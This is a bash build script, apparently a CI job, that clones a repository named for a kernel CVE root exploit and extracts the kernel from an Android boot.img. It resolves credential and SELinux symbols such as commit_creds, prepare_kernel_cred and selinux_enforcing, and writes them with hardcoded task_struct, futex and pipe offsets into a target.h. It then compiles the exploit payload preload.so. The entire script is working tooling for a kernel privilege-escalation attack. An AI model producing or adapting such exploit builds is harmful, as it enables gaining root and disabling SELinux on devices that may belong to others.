#!/bin/bash
set -e
DEVICE="$1"
WORKSPACE="${GITHUB_WORKSPACE:-$(pwd)}"

echo "=== Cloning source ==="
git clone --depth 1 https://github.com/woshimaniubi8/CVE-2026-43499-root-KernelSU.git jailbreak
cd jailbreak

echo "=== Inspecting reference target.h ==="
REF_TARGET=$(find . -name "target.h" -not -path "./.git/*" | head -n1)
[ -n "$REF_TARGET" ] && { echo "Reference: $REF_TARGET"; head -n 40 "$REF_TARGET"; } || echo "[*] No reference found"

echo "=== Extracting kernel from boot.img ==="
mkdir -p /tmp/kextract

python3 << PYEOF
import struct, sys

with open("$WORKSPACE/images/boot.img", 'rb') as f:
    header = f.read(4096)
    
    if header[:8] != b'ANDROID!':
        print("ERROR: Not a valid boot.img")
        sys.exit(1)
    
    kernel_size = struct.unpack('<I', header[8:12])[0]
    header_size = struct.unpack('<I', header[0x0c:0x10])[0]
    
    if header_size == 0:
        page_size = struct.unpack('<I', header[36:40])[0]
        hdr_sz = page_size
    elif header_size in (1232, 1580):
        hdr_sz = header_size
    else:
        page_size = struct.unpack('<I', header[36:40])[0]
        hdr_sz = page_size if page_size >= 2048 else 4096
    
    print(f"[+] Header size: {hdr_sz}, Kernel size: {kernel_size}")
    f.seek(hdr_sz)
    kernel = f.read(kernel_size)
    
    with open('/tmp/kextract/kernel.gz', 'wb') as o:
        o.write(kernel)
    print(f"[+] Extracted {len(kernel)} bytes")
PYEOF

cd /tmp/kextract

echo "=== Attempt 1: extract-vmlinux (Linux official script) ==="
if ! command -v extract-vmlinux >/dev/null 2>&1; then
    curl -fsSL -o extract-vmlinux https://raw.githubusercontent.com/torvalds/linux/master/scripts/extract-vmlinux
    chmod +x extract-vmlinux
fi

if ./extract-vmlinux kernel.gz > vmlinux 2>/dev/null && [ -s vmlinux ]; then
    echo "[+] extract-vmlinux succeeded"
else
    echo "[!] extract-vmlinux failed"
    
    echo "=== Attempt 2: manual decompression ==="
    SUCCESS=0
    for tool in gzip lz4 zstd xz; do
        if command -v $tool >/dev/null 2>&1; then
            echo "  Trying $tool..."
            if $tool -dc kernel.gz > kernel.raw 2>/dev/null && [ -s kernel.raw ]; then
                echo "  [+] Decompressed with $tool"
                SUCCESS=1
                break
            fi
        fi
    done
    
    if [ "$SUCCESS" != "1" ]; then
        echo "[!] All decompression failed"
        exit 1
    fi
    
    echo "=== Checking kernel.raw format ==="
    file kernel.raw
    
    if file kernel.raw | grep -q ELF; then
        cp kernel.raw vmlinux
        echo "[+] kernel.raw is ELF"
    else
        echo "[*] kernel.raw is raw binary, trying vmlinux-to-elf..."
        python3 -c "
from vmlinux_to_elf.extract_vmlinux import extract_vmlinux
extract_vmlinux('/tmp/kextract/kernel.raw', '/tmp/kextract/vmlinux')
" 2>/dev/null || true
    fi
fi

if [ ! -f vmlinux ] || [ ! -s vmlinux ]; then
    echo "[!] Failed to obtain vmlinux"
    exit 1
fi

echo "[+] vmlinux ready, size: $(stat -c%s vmlinux)"

echo "=== Extracting kernel symbols ==="
cd /tmp/kextract

KERNEL_BASE=$(aarch64-linux-gnu-nm vmlinux 2>/dev/null | grep ' T _text$' | awk '{print "0x"$1}' | head -n1)
[ -z "$KERNEL_BASE" ] && KERNEL_BASE="0xffffffc008000000"
echo "[+] Kernel base: $KERNEL_BASE"

get_sym() {
    local name="$1"
    local addr=$(aarch64-linux-gnu-nm vmlinux 2>/dev/null | grep " [Tt] $name\$" | awk '{print "0x"$1}' | head -n1)
    if [ -n "$addr" ] && [ "$addr" != "0x" ]; then
        python3 -c "print(hex($addr - $KERNEL_BASE))"
    else
        echo "0xDEADBEEF"
    fi
}

INIT_TASK=$(get_sym "init_task")
INIT_CRED=$(get_sym "init_cred")
COMMIT_CREDS=$(get_sym "commit_creds")
PREPARE_KERNEL_CRED=$(get_sym "prepare_kernel_cred")
OVERRIDE_CRED=$(get_sym "override_creds")
REVERT_CRED=$(get_sym "revert_creds")
SELINUX_ENFORCING=$(get_sym "selinux_enforcing")
SELINUX_STATE=$(get_sym "selinux_state")
SELINUX_SS=$(get_sym "selinux_ss")
PIPE_BUF_OPS=$(get_sym "pipe_buf_ops")
ANON_PIPE_BUF_OPS=$(get_sym "anon_pipe_buf_ops")

echo "Symbols: INIT_TASK=$INIT_TASK INIT_CRED=$INIT_CRED COMMIT_CREDS=$COMMIT_CREDS SELINUX_ENFORCING=$SELINUX_ENFORCING"

echo "=== Generating target.h ==="
cd "$WORKSPACE/jailbreak"
mkdir -p "src/targets/$DEVICE"

cat > "src/targets/$DEVICE/target.h" << EOF
#ifndef TARGET_H
#define TARGET_H

#define KERNEL_BASE     ${KERNEL_BASE}ULL

#define INIT_TASK       ${INIT_TASK}
#define INIT_CRED       ${INIT_CRED}
#define COMMIT_CREDS    ${COMMIT_CREDS}
#define PREPARE_KERNEL_CRED ${PREPARE_KERNEL_CRED}
#define OVERRIDE_CRED   ${OVERRIDE_CRED}
#define REVERT_CRED     ${REVERT_CRED}

#define SELINUX_ENFORCING ${SELINUX_ENFORCING}
#define SELINUX_STATE   ${SELINUX_STATE}
#define SELINUX_SS      ${SELINUX_SS}

#define PIPE_BUF_OPS    ${PIPE_BUF_OPS}
#define ANON_PIPE_BUF_OPS ${ANON_PIPE_BUF_OPS}

#define TASK_STRUCT_PID_OFFSET      0x5E0
#define TASK_STRUCT_CRED_OFFSET     0x778
#define TASK_STRUCT_MM_OFFSET       0x520
#define TASK_STRUCT_COMM_OFFSET     0x7B0
#define TASK_STRUCT_FLAGS_OFFSET    0x448

#define RT_MUTEX_WAITER_LIST_OFFSET     0x00
#define RT_MUTEX_WAITER_PI_LIST_OFFSET  0x10
#define RT_MUTEX_WAITER_TASK_OFFSET     0x30

#define FUTEX_WAITER_LIST_OFFSET    0x18
#define PIPE_BUF_OFFSET             0x40
#define PIPE_BUF_OPS_OFFSET         0x58

#endif
EOF

echo "[+] Generated target.h"
cat "src/targets/$DEVICE/target.h"

echo "=== Building preload.so ==="
make PROJECT="$DEVICE" -j$(nproc)

echo "=== Copying outputs ==="
cp "build/$DEVICE/bin/preload.so" "$WORKSPACE/preload.so"
cp "src/targets/$DEVICE/target.h" "$WORKSPACE/target.h"
echo "[+] Build complete"
